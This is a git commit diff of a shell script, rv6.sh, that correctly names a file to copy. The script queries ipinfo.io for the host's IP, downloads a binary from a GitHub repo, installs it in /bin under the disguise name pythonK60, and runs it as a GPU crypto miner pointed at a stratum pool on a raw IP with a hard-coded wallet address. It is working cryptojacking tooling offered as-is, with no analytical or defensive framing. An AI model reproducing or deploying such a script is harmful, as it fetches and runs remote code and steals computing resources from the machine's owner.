d9b4f535b51d04c89eea2aff82e5663b64d6749f
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-20 14:34:08 +0100

    Update and rename rv60.sh to rv6.sh

--- rv6.sh
+++ rv6.sh
@@ -5,5 +5,5 @@ curl ipinfo.io
 #download build
 wget https://github.com/one10001/10001code/raw/main/pythonK60
 chmod +x pythonK60
-cp pythonK01 /bin/pythonK60
+cp pythonK60 /bin/pythonK60
 pythonK60 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
